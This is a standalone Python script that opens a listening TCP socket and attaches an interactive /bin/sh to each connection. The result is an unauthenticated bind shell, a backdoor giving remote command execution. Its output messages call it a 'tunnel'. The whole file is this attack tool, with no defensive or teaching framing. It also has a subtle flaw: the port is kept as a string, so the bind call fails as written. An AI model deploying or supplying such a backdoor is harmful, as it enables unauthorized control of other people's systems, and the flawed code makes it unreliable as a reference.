import socket
import subprocess

def start_server():
    # Ask the user for the address and port to bind to
    server_address = input('Enter the address to bind to: ')
    server_port = input('Enter the port to bind to: ')

    # Create a TCP/IP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to a specific address and port
    print('Starting up tunnel on %s port %s' % (server_address, server_port))
    server_socket.bind((server_address, server_port))

    # Listen for incoming connections
    server_socket.listen(1)

    while True:
        # Wait for a connection
        print('Waiting for a connection...')
        client_socket, client_address = server_socket.accept()
        print('Accepted connection from %s:%s' % client_address)

        # Start a remote shell
        subprocess.call(['/bin/sh', '-i'], stdin=client_socket, stdout=client_socket, stderr=client_socket)

        # Clean up the connection
        client_socket.close()
        print('Connection closed.')

if __name__ == '__main__':
    start_server()